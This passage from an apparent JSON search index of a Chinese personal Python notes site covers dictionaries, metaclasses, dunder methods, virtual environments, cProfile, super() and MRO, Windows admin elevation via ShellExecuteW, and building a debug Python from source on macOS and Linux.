字典的遍历是有序的(通过使用一个排序过的双链表来保存键值对实现), 不过, 字典在插入时仍然无序, 有序性仅体现在遍历和排序时. 使用sorted排序 技巧 仅针对Python3.7 之后的版本 测试代码: data = { 'a': 1, 'b': 2, 'outer': 3, 'c': 4 } print('origin ========') for one in data: print(one) data_new = sorted(data, key=lambda o: o != 'outer', reverse=False) print('after sort ========') for one in data_new: print(one) 输出: origin ======== a b outer c after sort ======== outer a b c 这里我没有弄明白为什么 o != 'outer' 结果是放在最前面, 而 o == 'outer' , outer在最后. 合并字典的方式 注意 **a2 这里， key不能为 非str, 因为是当做参数传递解析的: a1, a2 = dict(), dict() b = dict(a1, **a2)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Dictionary.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Dictionary.html"},{"title":"元类","text":"默认情况下，类是使用 type() 来构建的。类体会在一个新的命名空间内执行， 类名会被局部绑定到 type(name, bases, namespace) 的结果。 类创建过程可通过在定义行传入 metaclass 关键字参数，或是通过继承一个包含此参数的现有类来进行定制。 在以下示例中，MyClass 和 MySubclass 都是 Meta 的实例: class Meta(type): pass class MyClass(metaclass=Meta): pass class MySubclass(MyClass): pass","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Meta--category.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Meta--category.html"},{"title":"object类","text":"方法 new init getattribute getattr setattr delattr enter exit str class iter getitem setitem __new__ __init__ __getattribute__ __setattr__ __delattr__ __enter__/__exit__ __str__() code: def __str__(self, *args, **kwargs): ... 设置直接打印实例时的值, 可以理解成将其转换为str类型的值 __class__ 使自身可迭代, 即可使用 for/next 循环. 使自身可以用字典的形式 obj['x'] 来取值. __setitem__ 可与 getitem 一起使用, 不过这个是设置值的. other 待后面补充: def __eq__(self, o: object) -> bool: ... def __ne__(self, o: object) -> bool: ... def __str__(self) -> str: ... def __repr__(self) -> str: ... def __hash__(self) -> int: ... def __format__(self, format_spec: str) -> str: ... def __sizeof__(self) -> int: ... def __reduce__(self) -> Union[str, Tuple[Any, ...]]: ... def __reduce_ex__(self, protocol: int) -> Union[str, Tuple[Any, ...]]: ... def __dir__(self) -> Iterable[str]: ... def __init_subclass__(cls) -> None: ... 类属性 或者说成员变量 __slots__ __dict__ __doc__ __module__ __annotations__","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Object-class.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Object-class.html"},{"title":"包/模块结构说明","text":"在官网下载好并安装好后, 可以发现包存放的目录有 Lib 目录存放标准库 Lib/site-packages 目录存放安装的第三方包/模块 Script 目录存放可执行文件, 如python/pip (Unix貌似是 bin) 模块 每一个单独的py文件, 比如main.py, 就是模块 包 包包含了多个模块, 属于一种有组织的结构","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Pack,-module-structure.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Pack,-module-structure.html"},{"title":"python命令选项与参数","text":"-m <module> 指定模块 -i 执行结束时打开交互式界面","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-command-options-and-parameters.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-command-options-and-parameters.html"},{"title":"Python线程池及其原理","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html"},{"title":"Python使用技巧/问题","text":"进度条 最原始数字实现: def print_hi(): n = 100 for i in range(n): for j in range(n): j += i print(f\"{i+1} / {n}\", end='\\r') 效果: 8622 / 10000 百分比进度条: def print_hi(): n = 10000 for i in range(n): for j in range(n): j += i # print(i) # print(f\"{i+1} / {n}\", end='\\r') print(\"进度·\", f\"|{ '+' * ((i+1) * 100 // n):100}|\", f\"{(i+1) * 100 // n}/%\", end='\\r') 效果 其他第三方进度条库模块: /docs/后端/python/python三方库/progress /docs/后端/python/python三方库/tqdm /docs/后端/python/python三方库/alive-progress 多赋值 普通多赋值: In [10]: product_info = ['apple', '5', 1000] In [11]: name, price, num = product_info In [12]: name, price, num Out[12]: ('apple', '5', 1000) In [13]: 如果只需要部分, 其它的任意变量占位即可, 如只需要name: In [13]: name, *_ = product_info In [14]: name, _ Out[14]: ('apple', ['5', 1000]) 技巧 可使用 * 赋值为列表 适用与任何可迭代对象, 如list, str 获取参数列表 函数内部 函数内部 获取, 使用 locals In [1]: def fun1(a, b, c): ...: d = 4 ...: print(locals()) ...: print(a, b, c) ...: In [2]: fun1(1, 2, 3) {'a': 1, 'b': 2, 'c': 3, 'd': 4} 1 2 3 函数外部 函数外部 获取, 使用 __code__.co_varnames , 只能获取参数名 In [4]: fun1.__code__.co_varnames Out[4]: ('a', 'b', 'c', 'd') 或者使用 inspect 模块, 获取形参列表和默认参数, 例: In [8]: import inspect In [9]: inspect.getargspec(fun1) <ipython-input-9-96541cc6565c>:1: DeprecationWarning: inspect.getargspec() is deprecated since Python 3.0, use inspect.signature() or inspect.getfullargspec() inspect.getargspec(fun1) Out[9]: ArgSpec(args=['a', 'b', 'c'], varargs=None, keywords=None, defaults=None) In [10]: inspect.signature(fun1) Out[10]: <Signature (a, b, c)> In [11]: inspect.getfullargspec(fun1) Out[11]: FullArgSpec(args=['a', 'b', 'c'], varargs=None, varkw=None, defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={}) 看起来建议使用 getfullargspec 获取的最详细. 技巧 相关 获取函数参数个数(形参个数): In [6]: fun1.__code__.co_argcount Out[6]: 3 获取函数参数默认值(元组), 如果有: In [7]: fun1.__defaults__ 关于字典 当字典的元素个数少于1000时，应使用: dData.keys(),dData.items(),dDate.values() 当字典的元素个数超过1000时，为了提高效率，可以使用: dData.iterkeys(),dData.iteritems,dData.itervalues() 当没有把握时，采用第一种keys的方案 keys，items，values会创建新的副本参与元素遍历，安全性更高， 而iter是迭代器的概念，直接用元素的内存地址指针参与每个元素的遍历 多个变量的赋值 创建一个整型对象，值为1，三个变量被分配到相同的内存空间上: a = b = c = 1 a,b,c分别被赋值为1,2，\"john\": a, b, c = 1, 2, \"john\" Python 五个标准的数据类型 Numbers: 数字 String: 字符串 List: 列表 Tuple: 元组 Dictionary: 字典 Python支持四种不同的数字类型 int: 有符号整型 long: 长整型，也可以代表八进制或者十六进制 float: 浮点型 complex: 复数 python2.2之后int溢出后会自动自动转换为long，3中long被移除 在python中类型属于对象，变量是没有类型的 字符串的操作 截取字符串: str = 'hello' print str[1:4] #ell # str[start:end],从下标start开始，end结束，不包括end 将字符串转换为数组: str = 'hi yo' print str.split() #['hi', 'yo'] # split，以指定字符串分隔, 不带参默认是空格 获取对象占用的内存大小 sys.getsizeof() 获取对象占用的内存大小 sys.modules sys.modules是一个全局字典，该字典是python启动后就加载在内存中， 每当导入新的模块，sys.modules都将记录这些模块。 字典sys.modules对于加载模块起到了缓冲的作用。 当某个模块第一次导入，字典sys.modules将自动记录该模块。 当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。 sys.argv[] sys.argv[0]表示代码本身文件路径以及调用时的参数 sys.argv[]说白了就是一个从程序外部获取参数的桥梁， 这个\"外部\"很关键，所以那些试图从代码来说明它作用的解释一直没看明白。 因为我们从外部取得的参数可以是多个，所以获得的是一个列表（list)， 也就是说sys.argv其实可以看作是一个列表，所以才能用[]提取其中的元素。 其第一个元素是程序本身，随后才依次是外部给予的参数: sys.argv[num] #调用时的第num个参数，0表示脚本本身 四舍五入 code: format(1.23456, '.2f') '%.4f' % 1.23456 还有一个 /docs/后端/python/内置函数/round 不是很建议, 除非对精度无要求 获取集合中最大/小的N个元素 如果 N == 1, 那么还是使用 min(), max() 好点 N > 1 时, 使用 /docs/后端/python/python标准库/heapq 的: heapq.nlargest(n, iterable, key=None) 获取最大n个元素 heapq.nsmallest(n, iterable, key=None) 获取最小n个元素 字典的一些不常见操作 例: a={ 'x' : 1, 'y' : 2, 'z' : 3 } b={ 'w' : 10, 'x' : 11, 'y' : 2 } 操作: # Find keys in common a.keys() & b.keys() # { 'x', 'y' } # Find keys in a that are not in b a.keys() - b.keys() # { 'z' } # Find (key,value) pairs in common a.items() & b.items() # { ('y', 2) } 一个字典就是一个键集合与值集合的映射关系。字典的 keys() 方法返回一个展现 键集合的键视图对象。 键视图的一个很少被了解的特性就是它们也支持集合操作，比如 集合并、交、差运算。 所以，如果你想对集合的键执行一些普通的集合操作，可以直接 使用键视图对象而不用先将它们转换成一个 set。 字典的 items() 方法返回一个包含 (键，值) 对的元素视图对象。 这个对象同样也 支持集合操作，并且可以被用来查找两个字典有哪些相同的键值对。 尽管字典的 values() 方法也是类似，但是它并不支持这里介绍的集合操作。 某种 程度上是因为值视图不能保证所有的值互不相同，这样会导致某些集合操作会出现问题。 不过，如果你硬要在值上面执行这些集合操作的话，你可以先将值集合转换成 set， 然后再执行集合运算就行了。 序列中出现次数最多的元素 collections.Counter 见 /docs/后端/python/python标准库/collections 下划线 在Python中，下划线（underscore）有多种用途，包括： 单个前导下划线： _var ，表示该变量是一个私有变量，建议不要在类的外部直接访问。 单个结尾下划线： var_ ，避免与Python关键字或内置函数冲突。 双前导下划线： __var ，表示该变量是一个强制私有变量，不能在类的外部直接访问。在类内部通过`self.__var`的方式访问。 双前导和双结尾下划线： __var__ ，表示Python内置的方法或属性，避免与自定义方法或属性发生冲突。 单个独立下划线： _ ，作为占位符使用，表示某个变量或参数没有被使用。 在交互式界面中, 默认表示最近一次的值. 需要注意的是，在Python中使用下划线并不是强制性的，而只是一种编码规范。但是，遵守这些规范可以提高代码的可读性和可维护性。 特别的, 在python交互式控制台中, 单下划线表示上一个语句的返回值. 判断类型注解是否属于typing 判断类型注解是否引入了typing <an_is_typing> 关于数据类型模块使用注解 当使用 /docs/后端/python/python标准库/dataclasses 模块时, 可能会用到 /docs/后端/python/python标准库/typing 注解. 当需要获取注解的相关信息时, 可以使用 fields 函数: @dataclass class Person(object): name: str pet: List[Cat] = field(default_factory=list) pet2: Cat = field(default_factory=Cat) from typing import _GenericAlias for f in fields(Person): print('type', f.type) 返回结果是 typing.Field 的一个迭代 一些内置类型的注解 比如 函数类型的注解, 可以使用 /docs/后端/python/python标准库/types 下的定义, 如: def _fun(): ... import types assert types.FunctionType == type(_fun) 判断是否是协程函数, 调用后可以使用 Awaitable, 未调用时只能使用 import asyncio asyncio.iscoroutinefunction() 实际会调用 inspect 模块下的 iscoroutinefunction Python定义抽象类/接口类 见 Python_抽象/接口类 使用 abc 会定义的抽象类会强制进行类型检查, 并不建议使用强制类型检查, 因为Python是一门动态语言, 这样不但降低性能, 而且显得舍本逐末. 可以直接按照普通的定义, 抽象基类直接抛异常即可: class IBase(object): def method1(self): raise NotImplemented 快速实现比较方法 不想全部定义object比较的方法, 可以使用 /docs/后端/python/python标准库/functools 下的 total_ordering 装饰器 这样只需要定义任意一个比较方法, 就可以实现完整的比较. 不过性能较慢, 所以如果不是强需求的话, 还是手动都实现了吧, 实在不行, 定义个比较基类实现就行 判断语句 看这个例子: def fun(*args, **kwargs): return not (args or kwargs) def fun2(*args, **kwargs): return not args and not kwargs 当我没说... 进制说明 八进制以 0o 开头, 如: 0o755 进制转换见 Python_进制转换 同名类属性/实例变量与属性访问器(Property)的访问顺序 类属性: 定义类时定义的属性 实例属性: 类实例化后设置的属性 属性访问器: 使用 @property 修饰的属性方法 结果: 对于已经实例的对象而言, 优先查找@property属性访问器 注意: 如果定义同名的实例属性与属性访问器, 必须设置属性访问器的setter方法, 否则会报错. 若定义的类属性需要支持设置值时, 也需要设置, 否则报错. 如, 同名实例属性与属性访问器: class A(object): def __init__(self): self.name: str = '123' @property def name(self): return 'nnn' if __name__ == '__main__': a = A() print(a.name) 报错: self.name: str = '123' AttributeError: can't set attribute 同名类属性与属性访问器(不支持设置类属性值): class A(object): name: str = '123' @property def name(self): return 'nnn' if __name__ == '__main__': a = A() print(a.name) 结果: nnn","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Some-use-skills,-explanation.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Some-use-skills,-explanation.html"},{"title":"特殊字符","text":"部分特殊字符: \\n 换行符, 光标移到下一行开头 \\r 一般用于单行进度之类, 光标移动到当前行开头","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Special-characters.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Special-characters.html"},{"title":"对super的理解","text":"前言 Python的super常用于继承. 关于继承, 又不得不提到经典类与新式类. Python2.x 都是经典类 Python3.x 是新式类, 注意需要继承自 object 对于子类的某一个调用, 经典类会深度优先搜索的区寻找执行, 而新式类是广度优先搜索执行 (这里有个坑, 算不上真正的广度优先, 实际上主要还是参考MRO的实现, 不过最后一个找的一般都是object, 或者说公共父类往往在此父类所有子类都找了后再找). 关于方法的执行顺序, 可以调用其 _mro_ 属性(method resolution order)查看继承顺序. 注解 关于 MRO的实现, 在网上看到一篇还可以的解释: MRO的实现, 可略微参考, 最后的计算看起有点问题. 更具体的还是去参考官方了. 新式类的搜索顺序更像是先深度, 但是把 object 这种公共顶层 放最后. super使用 在继承时, super可用于实现父类方法 class A ( object ): def eat ( self ): print ( 'A eat' ) class B ( A ): def eat ( self ): # 此处 super().eat() 与 super(B, self).eat() 效果一致 super () . eat () print ( 'B eat' ) 注解 super 如果带参数, 实际测试只有 ($class, self) 的形式才有效果, 会从 $class 开始向上找基类方法执行. 另外必须使用 super() 的形式, 也就是必须用其对象, 否则会报错没有属性.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Understanding-of-super.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Understanding-of-super.html"},{"title":"python导入说明","text":"跟踪导入 在 Python 中，import 语句用于导入模块和组件。 当编写一个 Python 程序时，通常需要使用许多不同的模块和库来完成某些任务。 在考虑将程序编译为可执行文件时，就需要考虑如何处理这些依赖项。 如果不包括所有必要的依赖项，则可能会导致生成的可执行文件无法正常运行。 跟踪导入是指编译器在编译过程中自动查找和包含程序所需的所有依赖项. 例如，如果一个 Python 脚本依赖于 numpy 库，则编译器应该能够自动识别并包含 numpy 库。 一些编译器（如 Nuitka）具有特定的选项，以便在编译过程中跟踪和包含依赖项。 这样可以确保生成的二进制文件包含程序的所有必需部分，并且可以在没有任何其他安装或配置的情况下运行程序。 总之， 跟踪导入是指在编译程序时跟踪和包含所有依赖项，以便生成一个完整的、独立的可执行文件","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-python-introduction-description.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-python-introduction-description.html"},{"title":"python虚拟环境","text":"部分说明可见: 创建Python虚拟环境 涉及到一个模块 pyvenv 创建虚拟环境: python -m venv <虚拟环境名> venv 支持的选项 --system-site-packages 是否使用全局环境的第三方库, 默认否 --without-pip 不安装pip, 默认会装 --clear 如果创建虚拟环境的目录已经有了其他虚拟环境，删除重建 会默认在当前环境下创建一个虚拟环境. 是否使用系统的包等信息配置在此目录下的 pyvenv.cfg 文件里, 其中: home 表示环境变量, python相关的一些指令就是从这个环境变量指定的目录下找 导入虚拟环境: source 虚拟环境名/bin/active . 启动 启动 # 当前目录下存在名为 venv_test_env 的虚拟环境 . venv_test_env/bin/activate 关闭 关闭 # 当前目录下存在名为 venv_test_env 的虚拟环境 # deactivate 默认已经写到环境变量里面了, 记得如果有用shell, 使用时不要覆盖此函数 deactivate","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-python-virtual-environment.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-python-virtual-environment.html"},{"title":"cProfile","text":"cProfile是Python标准库中内置的性能分析模块，C扩展，非侵入式，不需要修改代码。 使用方法: python -m cProfile [-s sort_order] myscript.py ` -s 指定输出的排序方法，可以传入tottime或者cumtime tottime表示该函数本身的执行时间，不包括该函数调用的子函数 cumtime表示该函数累计执行时间，包括该函数调用的子函数 输出列含义 ncalls是每个函数被调用次数 tottime表示该函数本身的执行时间，不包括该函数调用的子函数 第一个percall表示tottime / ncalls cumtime表示该函数累计执行时间，包括该函数调用的子函数 第二个percall表示cumtime / primitive calls，primitive calls 表示除去递归后本函数被调用次数 filename:lineno(function)表示函数所在的文件名，行号和函数名 cProfile是一种Deterministic Profiling. Deterministic Profiling是指记录所有函数每次的执行状况，而不是通过采样的方式来记录. 通过采样的方式，性能开销会更小，但是记录可能会不够准确. 生成火焰图 使用 -o 选项生成cProfile的二进制性能结果: python -m cProfile [-o output_file] myscript.py 再用 flameprof 生成火焰图: flameprof requests.prof > requests.svg 图分成上下两部分，上部的图是按照函数调用栈和执行时间排列; 下部反方向的图按照函数执行时间比例从大到小排列. 上部的图中execute是最顶层的函数，往上是它调用的子函数，直到调用链最底层的函数; 宽度表示每个函数的执行时间占用的比例，越宽表示越耗时.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-cprofile.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-cprofile.html"},{"title":"pyflame","text":"uber开源的一款工具，利用ptrace生成渲染图，用于分析性能瓶颈 地址: https://github.com/uber/pyflame","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-pyflame.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-pyflame.html"},{"title":"Python 判断某个类包含的类方法","text":"使用 types 与 isinstance class ITest ( object ): def get_one ( self ): raise NotImplemented def get_two ( self ): raise NotImplemented # 注意类方法是 FunctionType # 实例方法是 types.MethodType functions_ = [ k for k , v in ITest . __dict__ . items () if isinstance ( v , types . FunctionType )] print ( functions_ ) # ['get_one', 'get_two']","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html"},{"title":"获取win下管理员权限","text":"判断是否有管理员权限: import ctypes 'is admin' if ctypes.windll.shell32.IsUserAnAdmin() else 'not admin' 涉及到win API: IsUserAnAdmin 获取管理员权限: ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1) 参数解析: runas 表示以管理员权限执行 sys.executable 表示打开的执行文件. 这里一般都在python内跑就是 python.exe (python的安装路径) __file__ 执行文件跟的参数 注解 如果是python2, 那么 sys.executable , __file__ 都需要加上 unicode, 如 unicode(__file__) sys.version_info[0] == 3 判断python版本是否是 3 涉及到win API: shellExecuteW","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html"},{"title":"在一个Python环境使用另一个Python环境的包","text":"仅针对三方包. 需求: 当使用一个虚拟环境时, 想导入另一个虚拟环境的三方包 主要有两种解决方案 手动安装需要的包 : 使用 pip freeze 导出另一个虚拟环境的三方包信息到 requirements.txt, 然后手动安装 配置环境变量PYTHONPATH : 将另一个虚拟环境的三方包加入到环境变量 PYTHONPATH 手动安装需要的包 大致: source /path/to/venv_b/bin/activate pip freeze > /path/to/requirements.txt source /path/to/venv_a/bin/activate pip install -r /path/to/requirements.txt 注解 不确定直接: sys.path.insert(...) 是否可行, 有时间实验一下 配置环境变量PYTHONPATH 找到另一个虚拟环境的三方包目录: source /path/to/venv_b/bin/activate python -c \"import site; print(site.getsitepackages())\" 将虚拟环境b的 site-packages 目录添加到 PYTHONPATH 环境变量中(也可以直接在Python的os.environ中设置): export PYTHONPATH=$PYTHONPATH:/path/to/venv_b/lib/pythonX.Y/site-packages 在虚拟环境a中调用虚拟环境b的包: source /path/to/venv_a/bin/activate python import module_name","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html"},{"title":"高级Python","text":"主要对Python中支持的操作做一个归纳总结. 生成器效率高于推导式 字符串操作 普通字符串, 直接使用内置的: split 转换为数组 replace 替换字符 find 查找字符位置 使用 /docs/后端/python/python标准库/re 模块: re.sub 使用正则替换 re.match 从字符串开始匹配 re.findall 查找所有匹配的字符串 注意: 使用正则时候的贪婪匹配与非贪婪匹配 . 表示除换行外的任意字符 () 表示分组 ?: 大量匹配, 是用 re.compile 先预编译 元祖转换对象","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Advanced-Python.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Advanced-Python.html"},{"title":"debug版本python安装","text":"参考: https://docs.python.org/zh-cn/3.11/using/unix.html 找了一下资料, debug版本只有windows可以通过安装包安装, 其他如linux、mac等都得手动编译安装. Mac下的安装 基本指令: wget https://www.python.org/ftp/python/3.9.10/Python-3.9.10.tgz tar -xzf Python-3.9.10.tgz cd Python-3.9.10 ./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10 --with-openssl=/usr/local/opt/openssl@1.1 --with-lto make -j8 && sudo make altinstall --with-pydebug参数会编译带有debug符号的二进制文件,方便后期使用gdb进行调试 --enable-optimizations 用 PROFILE_TASK 启用以配置文件主导的优化（PGO）（默认为禁用）. C 编译器 Clang 需要用到 llvm-profdata 程序进行 PGO。在 macOS 上，GCC 也需要用到它：在 macOS 上 GCC 只是 Clang 的别名而已。 如果使用 --enable-shared 和 GCC ，还可以禁用 libpython 中的语义插值：在编译器和链接器的标志中加入 -fno-semantic-interposition 。 --prefix指定安装路径 --with-openssl指定openssl的路径, 否则ssl模块无法使用 --with-lto: 启用链接时优化（Link Time Optimization，简称LTO）。 链接时优化是一种编译器优化技术，通过在链接阶段对代码进行全局分析和优化，可以提高程序的性能。 在启用LTO时，编译器将生成中间表示形式（IR）并将其保存到目标文件中。 然后，在链接阶段，通过对所有目标文件中的IR进行深度优化和分析，以及整体代码重排和消除冗余等操作，生成最终可执行文件或库。 configure支持的参数可查看: https://docs.python.org/zh-cn/3.11/using/configure.html make相关: make ：用标准库构建Python, -j8表示8个任务并行安装 make clean ：移除构建的文件 make distclean ：与 make clean 相同，但也删除由配置脚本创建的文件 警告 make install 可以覆盖或伪装 python3 二进制文件(系统默认的python3)。 因此，建议使用 make altinstall 而不是 make install ， 因为后者只安装了 exec_prefix/bin/pythonversion 。 后续遇到的问题 使用nuitka编译时, 有时候源码能跑过的, 构建出来跑不了, 所以研究了一下对于构建好的应用, 能否在Python的层面进行调试, 结果似乎不能, 虽然意外发现有nuitka一个 --python-debug 选项, 也只能实现编译后 的文件保留了原有的行号变量等信息, 最终还是得gdb(mac下lldb)出手. 可参考: /docs/后端/python/python三方库/nuitka . 不过需要安装支持debug的python版本, 也就是编译安装python 时需要添加 --with-pydebug 选项... 最开始使用上述流程安装好python时候, python使用没问题, 使用nuitka构建的时候出现报错: Undefined symbols for architecture x86_64: \"_libintl_bindtextdomain\", referenced from: fish_bindtextdomain(char const*, char const*) in libfishlib.a(fallback.cpp.o) \"_libintl_gettext\", referenced from: fish_gettext(char const*) in libfishlib.a(fallback.cpp.o) \"_libintl_textdomain\", referenced from: fish_textdomain(char const*) in libfishlib.a(fallback.cpp.o) ld: symbol(s) not found for architecture x86_64 clang: error: linker command failed with exit code 1 (use -v to see invocation) 类似这样, 最开始查了一下以为是gettext库不对(在这之前已经安装了gettext), 以为出现找不到 _libintl, 是没设置好环境变量, 就设置了一下并重新编译安装: export LDFLAGS=\"-L/usr/local/opt/gettext/lib\" export CPPFLAGS=\"-I/usr/local/opt/gettext/include\" libintl 是 gettext 的一部分。gettext 是一个用于国际化和本地化的工具集， 它提供了一种方式来在应用程序中从源代码中提取文本，并将其翻译成不同的语言。 libintl 是 gettext 提供的一个库，用于处理多语言文本的运行时支持， 包括翻译、格式化和字符编码等功能。通过使用 libintl，开发人员可以轻松地实现多语言支持的应用程序。 结果还是发现有问题, 后面试过给nuitka加参数, 指定 LD_LIBRARY_PATH 等, 都失败了. 然后突然想起看一下动态库的链接是啥(linux下是ldd, mac默认没有, 有个相似的otool), 编译安装的debug版本如下: $ otool -L /usr/local/python/python3.9.10/bin/python3.9 /usr/local/python/python3.9.10/bin/python3.9: /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0) /usr/local/opt/gettext/lib/libintl.8.dylib (compatibility version 12.0.0, current version 12.0.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 又去找了一个正常的看: $ readlink -f `which python3` /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11 $ otool -L /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11 /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11: /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/Python (compatibility version 3.11.0, current version 3.11.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 一对比, 编译安装的多了个 /usr/local/opt/gettext/lib/libintl.8.dylib , ls查看了一下位置, 路径没问题啊, 为什么会这样? 百度无果, 开墙, 谷歌, 终于在github发现了类似的一个问题, 不过是由 CMAKE 引起, 参见: https://github.com/fish-shell/fish-shell/issues/5244 , CMAKE 也有说明有其他地方已经提出: https://gitlab.kitware.com/cmake/cmake/-/issues/18921 , 现在这问题四年了还没关. 有位大佬在19年已经说明好问题了: I can reproduce this - looks like I've got the Mono libintl, and if I add the brew gettext tools to my path, I get the same problem. I have spent some time reviewing the current state: - libintl is not shipped in macOS, but can be picked up by FindPackage(Intl) - the gettext binaries (msgfmt etc) are not shipped in macOS, but can be picked up by FindPackage(gettext) - if both libintl and the gettext binaries are detected, the include directories get added to the global include directories - regardless of the gettext state, the libintl libraries are added to the list of library dependencies of the fishlib target (this is inconsistent with the previous item and probably needs fixing, perhaps through an add_library target) If you have Mono installed, libintl's headers are picked up by CMake from /Library/Frameworks/Mono.framework, but the libraries are not found in the same prefix (Intl_LIBRARY:FILEPATH=Intl_LIBRARY-NOTFOUND). Unfortunately, this cannot be used as a signal that libintl is not available, because this is exactly the state that glibc is in with libintl compiled into the main library. This is only exposed as a problem when gettext is in the path, because of the requirement for both gettext and libintl for the include_directory call (as above). pkg-config would not help here, because it does not ship on macOS. I think this is a bug in CMake's FindIntl module, which I'll report to them. Someone has a similar problem in EOSIO/eos#1539. For now, you can work around this either by turning off the use of translation (cmake -DWITH_GETTEXT=0), or enable it by adding an additional library search path (cmake -DCMAKE_LIBRARY_PATH=/Library/Frameworks/Mono.framework/Libraries). 简而言之就是, 因为brew手动安装了gettext, 同时系统也安装了Mono(一个.Net的什么框架), 然而Mono下 已存在libintl库, 这个时候系统内就有两个地方存在这个库了. 然后编译安装Python时, 会自动探测包位置, brew包管理器发现了有gettext这个包, 所以就使用了, 但是, 用的这个又多了一些东西(暂且这么说, 实际编译时不需要这些), 就导致了使用nuitka时的报错 (他这里虽然是CMAKE, 但是原因是一致的). 而且后面fish-shell处理了这问题: https://github.com/fish-shell/fish-shell/commit/970a963896162617af3e18fb2df953dbeac0a4fc 注解 我就很诧异, 没其他人遇到这个问题吗... 看了一下我的 /Library/Frameworks/Mono.framework 下面, 果然已经有一个 libintl.8.dylib , 所以自己brew安装的gettext就是个多余的, 导致编译安装好的python多了个自安装的libintl动态库链接, 尝试过手动指定路径没找到方法, 最后 brew uninstall gettext 后再重新编译安装后解决: sudo make clean sudo make distclean sudo rm -rf /usr/local/python/python3.9.10 ./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10 --with-openssl=/usr/local/opt/openssl@1.1 sudo make -j8 && sudo make altinstall 查看链接位置: $ otool -L /usr/local/python/python3.9.10/bin/python3.9 /usr/local/python/python3.9.10/bin/python3.9: /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 正常了","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html"},{"title":"从源码安装Python","text":"主要是针对发布版本的Linux吧, 比如Ubuntu, 使用: apt install python3 会发现安装的是跟当前对应的版本, 比如20就是Python3.8. 要安装其他版本的Python就只有源码安装了, 官网源码下载 <https://www.python.org/downloads/source/> 如果看其他平台适用: https://www.python.org/downloads/ 源码安装一般分3步: 配置 configure 编译 make 安装 make install 可参考官网开发手册: Linux构建安装Python 前置依赖准备: sudo apt install build-essential gdb lcov pkg-config \\ libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\ libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\ lzma lzma-dev tk-dev uuid-dev zlib1g-dev python-dev 注解 官网并没提到要安装python-dev, 实际如果缺失会导致使用struct模块报错找不到_struct 创建安装目录, 创建/usr/local/python37作为安装目录 mkdir /usr/local/python37 配置: ./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations --prefix=/opt/python3.9用来指定安装位置 --with-pydebug添加调试工具用 --enable-optimizations对编译结果进行优化，提高运行效率，但会增加编译时间 编译: make 可以使用 -j 参数指定CPU个数进行并行编译 检查编译: make test 安装: sudo make altinstall 也可使用install，代价是它可能会更改自带的python3安装，使得卸载变得困难，甚至使自带的python3变得不可用 总结, 所有指令 : sudo apt install build-essential gdb lcov pkg-config \\ libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\ libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\ 